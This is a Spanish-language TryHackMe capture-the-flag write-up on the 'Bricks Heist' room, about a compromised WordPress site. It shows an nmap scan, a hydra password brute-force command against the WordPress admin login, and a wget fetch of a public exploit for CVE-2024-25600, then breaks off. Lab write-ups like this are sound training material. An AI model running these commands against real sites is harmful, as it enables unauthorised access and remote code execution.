---
title: "Test"
platform: "THM"
publishedAt: 2025-05-09
cover: "/images/ctf/nota1-cover.webp"
---

# 🧱 TryHackMe – Bricks Heist | Write-up técnico


![image.png](/images/ctf/nota1-0.webp)


![image.png](/images/ctf/nota1-1.webp)


En este reto de TryHackMe nos enfrentamos a un escenario en el que un sitio WordPress ha sido comprometido por un actor malicioso. Nuestra misión es investigar, identificar cómo se produjo el ataque, qué malware fue desplegado, y qué grupo está detrás.


---


## 🔍 Reconocimiento inicial


Comenzamos con un escaneo completo:


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Se detectan los siguientes servicios:

- **22/tcp** – OpenSSH
- **80/tcp** – WebSockify (retorna error 405)
- **443/tcp** – Apache + WordPress 6.5
- **3306/tcp** – MySQL (sin autenticación)

---


## 🎯 Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

---


## 🔓 Acceso inicial


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💥 Explotación del CVE


Usamos el exploit público para el CVE-2024-25600:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```

